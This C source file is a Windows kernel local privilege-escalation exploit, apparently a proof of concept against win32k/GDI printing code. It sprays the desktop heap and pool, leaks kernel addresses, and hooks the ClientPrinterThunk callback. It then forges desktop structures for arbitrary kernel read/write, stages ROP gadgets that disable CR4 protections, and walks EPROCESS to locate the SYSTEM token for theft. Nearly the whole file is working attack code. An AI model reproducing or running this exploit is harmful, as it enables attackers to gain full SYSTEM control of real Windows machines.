#include <windows.h>
//#include <wdm.h>
#include <ntstatus.h>
#include <stdio.h>
#include <winddi.h>
#include <winspool.h> 
#include <tchar.h>

#include <ntstatus.h>
#include "ntos.h"
#pragma comment(lib, "ntdll.lib")
#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
//#pragma comment(lib,"Ntoskrnl.lib")
typedef WNDOBJ(__stdcall* gEngCreateWnd)(SURFOBJ,HWND, WNDOBJCHANGEPROC,FLONG,INT);
typedef int(__fastcall* gNtGdiExtEscape)(HDC, PWCHAR, INT, INT, INT, LPSTR, INT, LPSTR);
typedef BOOL(__fastcall* gNextBand)(HDC,BOOL, POINTL*, PSIZE);
typedef BOOL(__fastcall* gNtGdiExtTextOutW)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT, DWORD);
typedef NTSTATUS(NTAPI* pUser32_ClientPrinterThunk)(PVOID p);
typedef BOOL(__fastcall* gNtGdiExtTextOut)(HDC, INT, INT, UINT, LPRECT, LPWSTR, INT, LPINT);
typedef BOOL(__stdcall* gDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);
typedef void(_stdcall* gDrvDisableDriver)();
typedef NTSTATUS(__stdcall* pDrvEnableDriver)(PVOID p);
pDrvEnableDriver		g_originalDED = NULL;
PVOID g_ppDED = NULL;
typedef void(__stdcall* gNtGdiFlushUserBatch)();
typedef BOOL(__fastcall* gNtGdiDoBanding)(HDC,BOOL, POINTL,PSIZE);
typedef BOOL(__stdcall* hookFunction)(SURFOBJ,POINTL);
typedef ULONG(NTAPI* lpfNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

pUser32_ClientPrinterThunk		g_originalCPT = NULL;
PVOID g_ppCPT = NULL;
typedef BOOL(__fastcall* gNtGdiEndDoc)(HDC);
gNtGdiEndDoc ntgdiedobanding;
gNtGdiExtEscape g_NtGdiExtEscape;

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, * PLARGE_UNICODE_STRING;

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
	ULONG				 Reserved3;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 LoadCount;
	WORD                 NameOffset;
	CHAR                 Name[256];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;



typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);


typedef struct _HANDLEENTRY {
	PVOID  phead;
	ULONG_PTR  pOwner;
	BYTE  bType;
	BYTE  bFlags;
	WORD  wUniq;
}HANDLEENTRY, * PHANDLEENTRY;


typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD64 cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
}SERVERINFO, * PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PHANDLEENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelta;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
}SHAREDINFO, * PSHAREDINFO;

typedef VOID(__stdcall* NtUserDefSetText)(HANDLE hWnd, PLARGE_UNICODE_STRING plstr);
NtUserDefSetText g_NtUserDefSetText;
HDC hdc = NULL;
gDrvEnableDriver g_fake = NULL;
void* fDrvEnableDriver1 = NULL;
HDC g_hdc;


HDC hDc;
INT64 kernelBase;
HDC hMemDC;
static HBITMAP bitmaps[2200];
HWND hwnds[0x1000];
HWND g_window1 = NULL;
HWND g_window2 = NULL;
HWND g_window3 = NULL;
const WCHAR g_windowClassName1[] = L"Manager_Window";
const WCHAR g_windowClassName2[] = L"Worker_Window";
const WCHAR g_windowClassName3[] = L"Spray_Window";
WNDCLASSEX cls1;
WNDCLASSEX cls2;
WNDCLASSEX cls3;
DWORD64 g_ulClientDelta;
PSHAREDINFO g_pSharedInfo;
PSERVERINFO g_pServerInfo;
HANDLEENTRY* g_UserHandleTable;
DWORD64 g_pvDesktopBase;
PVOID leak_cbwndExtra;
PDWORD64 g_fakeDesktop = NULL;
DWORD64 g_winStringAddr;
DWORD64 g_rpDesk;
PDWORD64 buffer1;
#ifdef _WIN64
typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);
#else
typedef void* (__fastcall* lHMValidateHandle)(HWND h, int type);
#endif


lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _DESKTOPINFO
{
	/* 000 */ PVOID        pvDesktopBase;
	/* 008 */ PVOID        pvDesktopLimit;

} DESKTOPINFO, * PDESKTOPINFO;
typedef struct _CLIENTINFO
{
	/* 000 */ DWORD             CI_flags;
	/* 004 */ DWORD             cSpins;
	/* 008 */ DWORD             dwExpWinVer;
	/* 00c */ DWORD             dwCompatFlags;
	/* 010 */ DWORD             dwCompatFlags2;
	/* 014 */ DWORD             dwTIFlags;
	/* 018 */ DWORD				filler1;
	/* 01c */ DWORD				filler2;
	/* 020 */ PDESKTOPINFO      pDeskInfo;
	/* 028 */ ULONG_PTR         ulClientDelta;

} CLIENTINFO, * PCLIENTINFO;
typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, * PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, * PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, * PTHRDESKHEAD;





LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc1(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		
		((PDWORD64)0x1a000070)[0] = 0x333333;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc2(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (wParam == 0x1234)
	{
		
		((PDWORD64)0x1a000070)[0] = 0x111111;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WProc3(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

BOOL createWnd()
{
	cls1.cbSize = sizeof(WNDCLASSEX);
	cls1.style = 0;
	cls1.lpfnWndProc = WProc1;
	cls1.cbClsExtra = 0;
	cls1.cbWndExtra = 0x8;
	cls1.hInstance = NULL;
	cls1.hCursor = NULL;
	cls1.hIcon = NULL;
	cls1.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls1.lpszMenuName = NULL;
	cls1.lpszClassName = g_windowClassName1;
	cls1.hIconSm = NULL;

	if (!RegisterClassEx(&cls1))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls2.cbSize = sizeof(WNDCLASSEX);
	cls2.style = 0;
	cls2.lpfnWndProc = WProc2;
	cls2.cbClsExtra = 0;
	cls2.cbWndExtra = 8;
	cls2.hInstance = NULL;
	cls2.hCursor = NULL;
	cls2.hIcon = NULL;
	cls2.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls2.lpszMenuName = NULL;
	cls2.lpszClassName = g_windowClassName2;
	cls2.hIconSm = NULL;

	if (!RegisterClassEx(&cls2))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	cls3.cbSize = sizeof(WNDCLASSEX);
	cls3.style = 0;
	cls3.lpfnWndProc = WProc3;
	cls3.cbClsExtra = 0;
	cls3.cbWndExtra = 8;
	cls3.hInstance = NULL;
	cls3.hCursor = NULL;
	cls3.hIcon = NULL;
	cls3.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	cls3.lpszMenuName = NULL;
	cls3.lpszClassName = g_windowClassName3;
	cls3.hIconSm = NULL;

	if (!RegisterClassEx(&cls3))
	{
		printf("Failed to initialize: %d\n", GetLastError());
		return FALSE;
	}

	//perform the desktop heap feng shui
	printf("[+] pool feng shui\n");
	DWORD size = 0x1000;
	
	HWND hWnd;
	for (DWORD i = 0; i < size; i++)
	{
		hWnd = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName3, L"Sprayer", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);
		hwnds[i] = hWnd;
	}

	DestroyWindow(hwnds[0xE00]);

	g_window1 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName1, L"Manager", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window1 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	DestroyWindow(hwnds[0xE01]);
	g_window2 = CreateWindowEx(WS_EX_CLIENTEDGE, g_windowClassName2, L"Worker", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (g_window2 == NULL)
	{
		printf("Failed to create window: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

DWORD64 leakWnd(HWND hwnd)
{
	HWND kernelHandle = NULL;
	DWORD64 kernelAddr = NULL;

	for (int i = 0; i < g_pServerInfo->cHandleEntries; i++)
	{
		kernelHandle = (HWND)(i | (g_UserHandleTable[i].wUniq << 0x10));
		if (kernelHandle == hwnd)
		{
			kernelAddr = (DWORD64)g_UserHandleTable[i].phead;
			break;
		}
	}
	return kernelAddr;
}

DWORD64 leakHeapData(DWORD64 addr)
{
	DWORD64 userAddr = addr - g_ulClientDelta;

	DWORD64 data = *(PDWORD64)userAddr;

	return data;
}

BOOL leakrpDesk(DWORD64 wndAddr)
{
	DWORD64 rpDeskuserAddr = wndAddr - g_ulClientDelta + 0x18;
	g_rpDesk = *(PDWORD64)rpDeskuserAddr;
	return TRUE;
}

VOID setupFakeDesktop()
{
	g_fakeDesktop = (PDWORD64)VirtualAlloc((LPVOID)0x2a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memset(g_fakeDesktop, 0x11, 0x1000);
}
VOID setupPrimitive()
{
	g_winStringAddr = leakHeapData(leakWnd(g_window2) + 0xe0);
	leakrpDesk(leakWnd(g_window2));
	setupFakeDesktop();
}

BOOL setupLeak()
{
	PTEB			teb = NtCurrentTeb();
	DWORD64 win32client = (DWORD64)teb->Win32ClientInfo;
	PCLIENTINFO pinfo = (PCLIENTINFO)win32client;
	g_ulClientDelta = pinfo->ulClientDelta;

	PDESKTOPINFO pdesktop = pinfo->pDeskInfo;
	g_pvDesktopBase = (DWORD64)pdesktop->pvDesktopBase;
	g_pSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
	g_UserHandleTable = g_pSharedInfo->aheList;
	g_pServerInfo = g_pSharedInfo->psi;

	return TRUE;
}

ULONG_PTR GetPsLookupProcessByProcessId;
ULONG_PTR leakwin32kbase;
INT64 getKernelBase() {
	
	printf("[+] Getting Kernel Base.\n");
	PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation) {
		printf("[-] Fail to Load the function NtQuerySystemInformation\n");
		exit(1);
	}
	ULONG len = 0;
	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	PRTL_PROCESS_MODULES pModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	if (status != (NTSTATUS)0x0) {
		printf("[-] NtQuerySystemInformation Fail\n");
		exit(1);
	}
	/*
	PVOID kernelImageBase = 0;
	for (int i = 0; i < pModuleInfo->NumberOfModules; i++) {
		kernelImageBase = pModuleInfo->Modules[i].ImageBase;
		printf("ntoskrnl.exe base addr: %p\n", kernelImageBase);

	}
	*/
	/*
	PVOID kernelImageBase = kernelImageBase = pModuleInfo->Modules[139].ImageBase;
	printf("win32kbase addr: %p\n", kernelImageBase);
	*/
	ULONG_PTR kernelImageBase = pModuleInfo->Modules[0].ImageBase;
	//leakwin32kbase = pModuleInfo->Modules[139].ImageBase;
	printf("[-] ntoskrnl.exe base addr: %p\n", kernelImageBase);
	
	PVOID MappedKernel= LoadLibraryExA(&pModuleInfo->Modules[0].FullPathName[pModuleInfo->Modules[0].OffsetToFileName], NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!MappedKernel) {
		printf("[-] Failed to load ntos\n");
	}
	for (int i = 0; i < pModuleInfo->NumberOfModules; i++) {
		if (lstrcmpA(&pModuleInfo->Modules[i].FullPathName[pModuleInfo->Modules[i].OffsetToFileName], "win32kbase.sys") == 0) {
			leakwin32kbase = pModuleInfo->Modules[i].ImageBase;
			break;
		}
	}
	
	

	GetPsLookupProcessByProcessId = (ULONG_PTR)GetProcAddress(MappedKernel, "PsInitialSystemProcess");
	GetPsLookupProcessByProcessId = kernelImageBase + GetPsLookupProcessByProcessId - (ULONG_PTR)MappedKernel;
	
	return kernelImageBase;

}



DWORD64 readQWORD(DWORD64 addr)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD size = 0x18;
	DWORD offset = addr & 0xF;
	addr -= offset;

	WCHAR data[0x19];
	g_fakeDesktop[0xF] = addr - 0x100;
	g_fakeDesktop[0x10] = 0x200;
	
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	
	SetWindowLongPtr(g_window1, 0x8, 0x4141414141414141);
	SetWindowLongPtr(g_window1, 0x118, addr);
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	DWORD res = InternalGetWindowText(g_window2, data, size);

	SetWindowLongPtrW(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
	
	SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
	
	CHAR* tmp = (CHAR*)data;
	DWORD64 value = *(PDWORD64)((DWORD64)data + offset);

	return value;
}

static HBITMAP bitmaps[2200];
LPVOID ptr_jmpfunc;
LPVOID ptr1;
LPVOID ptr2;
LPVOID ptr3;
LPVOID ptr4;
LPVOID ptr5;
LPVOID ptr6;
LPVOID store_rop_shell;
HPALETTE h;
static HPALETTE hp1[2200];
static HPALETTE hp[2200];

BOOL testData(SURFOBJ* pso, POINTL* pptl) {
	WNDOBJ* wdo;
	pptl->x = 0xffffffff;
	pptl->y = 0xffffffff;




	
	LOGPALETTE* rPalette;
	rPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0x1100 - 1) * sizeof(PALETTEENTRY));

	rPalette->palNumEntries = 0x1100;
	rPalette->palVersion = 0x0300;

	ntgdiedobanding(g_hdc);
	
	LOGPALETTE* lPalette;

	//0x1E3  = 0x7e8+8
	char buffer[2000];
	memset(buffer, 0x41414141, 2000);
	HBITMAP hmb;
	for (int i = 0; i < 2200; i++) {
		hmb=CreateBitmap(1, 30, 1, 32, &buffer);
		bitmaps[i] = hmb;
	}
	for (int s = 0; s < 2200; s++) {
		DeleteObject(bitmaps[s]);
	}
	INT64 vDelete = kernelBase + 0x12fb18;

	
	lPalette = (LOGPALETTE*)malloc(sizeof(LOGPALETTE) + (0xb4 - 1) * sizeof(PALETTEENTRY));

	lPalette->palNumEntries = 0xb4;

	
	lPalette->palVersion = 0x0300;
	
	INT64 pop_rcx = kernelBase + 0x157CB1;
	INT64 mov_cr4 = kernelBase + 0x1d87d7;
	INT64 write_pointer = kernelBase + 0x1b7b;




	*(ULONG_PTR*)((PBYTE)store_rop_shell+8) = 0x70678;
	*(ULONG_PTR*)((PBYTE)store_rop_shell + 16) = store_rop_shell;
	//*(ULONG_PTR*)((PBYTE)store_rop_shell + 24) = shellcode_addr;

	*(ULONG_PTR*)((PBYTE)store_rop_shell + 0x14) = ptr2;



	*(ULONG_PTR*)ptr_jmpfunc = 0x43415254;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x8) = ptr2;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x110) = (PBYTE)leak_cbwndExtra-0x8c+2;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x400) = (PBYTE)leak_cbwndExtra-3;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x304) = ptr2;
	*(ULONG_PTR*)((PBYTE)ptr1 + 0x30) = ptr3;
	*(ULONG_PTR*)((PBYTE)ptr3 + 0x60) = ptr4;
	*(ULONG_PTR*)((PBYTE)ptr4 + 0xDC) = 0x41414141;
	*(ULONG_PTR*)((PBYTE)ptr4 + 0xF0) = ptr6;
	*(ULONG_PTR*)((PBYTE)ptr4 + 0x9C) = 0;
	//*(ULONG_PTR*)((PBYTE)ptr6 + 0x8) = 0x41414141;
	*(ULONG_PTR*)((PBYTE)ptr3 + 0xf0) = ptr5;
	*(ULONG_PTR*)((PBYTE)ptr3 + 0x60 + 0x2c0) = ptr6;

	*(ULONG_PTR*)((PBYTE)ptr6 + 0x18) = 0x41414141;
	*(ULONG_PTR*)((PBYTE)ptr6 + 0xDC) = 0x41414141;
	*(ULONG_PTR*)((PBYTE)ptr3 + 0x60 + 0x98) = ptr6;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc +0x20) = ptr1;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x28) = (PBYTE)vDelete;
	*(ULONG_PTR*)((PBYTE)ptr_jmpfunc + 0x18) = store_rop_shell;

	*(ULONG_PTR*)(lPalette->palPalEntry+4) = 0x444E5745;
	*(ULONG_PTR*)(lPalette->palPalEntry + 8) = ptr_jmpfunc;
	*(ULONG_PTR*)(lPalette->palPalEntry + 122) = (PBYTE)ptr_jmpfunc+16;


	
	printf("[+] Spraying pool\n");
	for (int i = 0; i < 2200; i++) {
		h= CreatePalette(lPalette);
	
		hp[i] = h;
	}
	
	/*
	for (int i = 0; i < 2000; i++) {
		DeleteObject(hp[i]);
	}
	for (int i = 0; i < 2300; i++) {
		h = CreatePalette(lPalette);

		//hp[i] = h;
	}
	*/




	
	//VirtualFree(ptr, 0, MEM_RELEASE);


	/*
	for (int i = 0; i <= 1000; i++) {
		HANDLE h=CreateCompatibleBitmap(hDc, 100, 100);
		SelectObject(hMemDC, h);
		printf("HBITMAP %d ", h);
	}
	*/
	
	return TRUE;
}



int i = 0;
NTSTATUS NTAPI hookCPT(
	PVOID p
)
{
	i++;
	if (i == 4) {
		BOOL(*testfn_ptr)() = &testData;
		MEMORY_BASIC_INFORMATION thunkMemInfo;
		PVOID c = ((PBYTE)p + 24);
		PVOID d = *((ULONG_PTR*)c);
		PVOID e = (PBYTE)d+16;
		PVOID f = *((ULONG_PTR*)e);
		PVOID g = *(ULONG_PTR*)f;
		PVOID h = (PBYTE)g+0x218;
		//PVOID f = &e + 0x218;

		if (!VirtualProtect(h, sizeof(PBYTE), PAGE_EXECUTE_READWRITE, &thunkMemInfo)) {
			printf("Fail to set Read-Write: %d\n", GetLastError());
		}
		*(ULONG_PTR*)h = (*testfn_ptr);
		

	}




	return g_originalCPT(p);
}

VOID RtlInitLargeUnicodeString(PLARGE_UNICODE_STRING plstr, CHAR* psz, UINT cchLimit)
{
	ULONG Length;
	plstr->Buffer = (WCHAR*)psz;
	plstr->bAnsi = FALSE;
	if (psz != NULL)
	{
		plstr->Length = cchLimit;
		plstr->MaximumLength = cchLimit + sizeof(UNICODE_NULL);
	}
	else
	{
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}



VOID writeQWORD(DWORD64 addr, DWORD64 value)
{
	//The top part of the code is to make sure that the address is not odd
	
	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;
	
	DWORD64 size = 0x8;
	WCHAR *input[32+1];
	LARGE_UNICODE_STRING uStr;
	/*
	if (offset != 0)
	{
		filler = readQWORD(addr);
	}
	
	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (16 * i)) & 0xFFFF;
	}
	*/
	
	DWORD64 value2 = value;
	buffer1[9] = value2;
	DWORD64 value3 = value;
	for (DWORD i = 0; i < 8; i++)
	{
		input[i] = value;
		//input[i] = (value >> (16 * i)) & 0xFFFF;
		//input[i] += (value >> (16 * i)) & 0xFFFF;

	}


	RtlInitLargeUnicodeString(&uStr, input, 8 * 2);

	

	g_fakeDesktop[0x1] = 0;

	g_fakeDesktop[0xF] = addr- 0x100;

	
	g_fakeDesktop[0x10] = 0x200;


	SetWindowLongPtr(g_window1, 0x118, addr);
	
	
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);
	
	g_NtUserDefSetText(g_window2, &uStr);
	//cleanup
	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
}

VOID writeQWORD1(DWORD64 addr, DWORD64 value)
{
	//The top part of the code is to make sure that the address is not odd

	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;

	DWORD64 size = 0x8;
	WCHAR* input[32 + 1];
	LARGE_UNICODE_STRING uStr;
	/*
	if (offset != 0)
	{
		filler = readQWORD(addr);
	}

	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (16 * i)) & 0xFFFF;
	}
	*/

	DWORD64 value2 = value;
	buffer1[9] = value2;

	DWORD64 value3 = value;
	buffer1[13] = readQWORD(addr);
	input[0] = buffer1[13];
	
	input[1] = value;



	RtlInitLargeUnicodeString(&uStr, input, 8 * 2);



	g_fakeDesktop[0x1] = 0;

	g_fakeDesktop[0xF] = addr - 0x100;


	g_fakeDesktop[0x10] = 0x200;


	SetWindowLongPtr(g_window1, 0x118, addr);


	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	g_NtUserDefSetText(g_window2, &uStr);
	//cleanup
	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
}

VOID writeQWORD2(DWORD64 addr, DWORD64 value)
{
	//The top part of the code is to make sure that the address is not odd
	DWORD offset = addr & 0xF;
	addr -= offset;
	DWORD64 filler;
	DWORD64 size = 0x8;
	WCHAR input[0x16];
	LARGE_UNICODE_STRING uStr;

	if (offset != 0)
	{
		filler = readQWORD(addr);
	}
	/*
	for (DWORD i = 0; i < offset; i++)
	{
		input[i] = (filler >> (8 * i)) & 0xFF;
	}
	*/
	for (DWORD i = 0; i < 8; i++)
	{
		input[i] = (value >> (16 * i)) & 0xFFFF;
	}

	RtlInitLargeUnicodeString(&uStr, input, size);

	g_fakeDesktop[0x1] = 0;
	g_fakeDesktop[0xF] = addr - 0x100;
	g_fakeDesktop[0x10] = 0x200;

	SetWindowLongPtr(g_window1, 0x118, addr);
	SetWindowLongPtr(g_window1, 0x110, 0x0000002800000020);
	SetWindowLongPtr(g_window1, 0x50, (DWORD64)g_fakeDesktop);

	g_NtUserDefSetText(g_window2, &uStr);
	//cleanup
	SetWindowLongPtr(g_window1, 0x50, g_rpDesk);
	SetWindowLongPtr(g_window1, 0x110, 0x0000000e0000000c);
	SetWindowLongPtr(g_window1, 0x118, g_winStringAddr);
}
DRVENABLEDATA pded;


int main() {
	LoadLibraryA("user32.dll");
	printf("[+] Setup fake windows for exploit\n");
	createWnd();
	setupLeak();
	setupPrimitive();
	DOCINFO docinfo;
	PTEB teb = NtCurrentTeb();

	PPEB peb = teb->ProcessEnvironmentBlock;
	DWORD prot;
	DWORD err = NULL;

	MEMORY_BASIC_INFORMATION thunkMemInfo;
	RECT rect;
	POINTL pointL;
	LPXFORM pxf;
	PSIZE size;
	PERBANDINFO* ppbi;
	const XFORM* lpxf;
	HINSTANCE hinst = GetModuleHandle(NULL);;
	RtlZeroMemory(&pointL, sizeof(POINTL));
	kernelBase = getKernelBase();

	DWORD PID = GetCurrentProcessId();

	leak_cbwndExtra = leakWnd(g_window1) + 0xe8;


	ptr_jmpfunc = VirtualAlloc(NULL, 3000, MEM_RESERVE, PAGE_READWRITE); //reserving memory
	ptr_jmpfunc = VirtualAlloc(ptr_jmpfunc, 3000, MEM_COMMIT, PAGE_READWRITE); //commiting memory  
	ptr1 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	ptr2 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	ptr3 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	ptr4 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	ptr5 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	ptr6 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	store_rop_shell = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	buffer1 = (PDWORD64)VirtualAlloc((PVOID)0x1a000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	g_hdc = CreateDCA(0, "Microsoft XPS Document Writer", 0, 0);







	docinfo.cbSize = sizeof(DOCINFO);
	docinfo.lpszDocName = TEXT("C:\\test\\test.txt");
	docinfo.lpszOutput = TEXT("C:\\test\\test.xps");
	docinfo.lpszDatatype = (LPTSTR)(0);
	docinfo.fwType = 0;




	HMODULE loadLib = LoadLibrary(TEXT("gdi32full.dll"));
	if (!loadLib) {
		printf("Load gdi32full error: %d", GetLastError());
	}
	gNextBand g_NextBand = (gNextBand)GetProcAddress(loadLib, "NtGdiDoBanding");
	if (!g_NextBand) {
		printf("Get function NextBand error: %d", GetLastError());
	}
	g_NtGdiExtEscape = (gNtGdiExtEscape)GetProcAddress(loadLib, "NtGdiExtEscape");
	if (!g_NtGdiExtEscape) {
		printf("Get function g_NtGdiExtTextOutW error: %d", GetLastError());
	}

	ntgdiedobanding = (gNtGdiEndDoc)GetProcAddress(loadLib, "NtGdiEndDoc");

	HMODULE loadLibwin32u = LoadLibrary(TEXT("WIN32U"));
	if (!loadLibwin32u) {
		printf("Load win32u error: %d\n", GetLastError());
	}
	g_NtUserDefSetText = (NtUserDefSetText)GetProcAddress(loadLibwin32u, "NtUserDefSetText");
	if (!g_NtUserDefSetText) {
		printf("Get function NtUserDefSetText error: %d\n", GetLastError());
	}


	StartDocA(g_hdc, &docinfo);


	StartPage(g_hdc);


	//ExtEscape(g_hdc, WNDOBJ_SETUP, 8, (LPCSTR)&hWnd, 0, (LPSTR)NULL);


	//LPCSTR a = "Test String";
	//TextOutA(g_hdc, 0, 0, a, 11);
	g_ppCPT = &((PVOID*)peb->KernelCallbackTable)[0x67];
	if (!VirtualProtect(g_ppCPT, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot)) {
		printf("Fail in set read-write: %d", GetLastError());
	}




	g_originalCPT = InterlockedExchangePointer(g_ppCPT, &hookCPT);
	EndPage(g_hdc);
	



	
	buffer1[0]=leakwin32kbase;
	LPVOID ptr7 = VirtualAlloc(NULL, 3000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	writeQWORD(0xfffff78000000800, ptr7);
	DWORD64 gpHandler = leakwin32kbase + 0x11f0c8;
	PVOID eprocess = readQWORD(GetPsLookupProcessByProcessId);
	buffer1[1] = readQWORD(eprocess);
	buffer1[2] = readQWORD((PBYTE)eprocess + 0x2e8);
	buffer1[3] = eprocess;
	
	if ((readQWORD((PBYTE)eprocess + 0x2e8)) != 4) {
		exit(0);
	}

	printf("[+] Find current eprocess\n");
	PVOID systemToken = readQWORD((PBYTE)eprocess + 0x358);
	PVOID NextProcess = readQWORD((PBYTE)eprocess+0x2f0)-0x2e8-8;
	if (readQWORD((PBYTE)eprocess + 0x2e8) == 0) {
		exit(0);
	}
	DWORD NextPID;
	while (TRUE) {
		NextPID = readQWORD((PBYTE)NextProcess + 0x2e8);
		if (NextPID == PID || PID==0) {
			break;
		}
		NextProcess = readQWORD((PBYTE)NextProcess + 0x2f0) - 0x2e8 - 8;
	}
	printf("[+] Overwrite Token\n");
	//writeQWORD1((PBYTE)NextProcess + 0x2e8, 0x123000);
	//writeQWORD1((PBYTE)NextProcess + 0x2e0, 0x1234);
	buffer1[4] = NextPID;
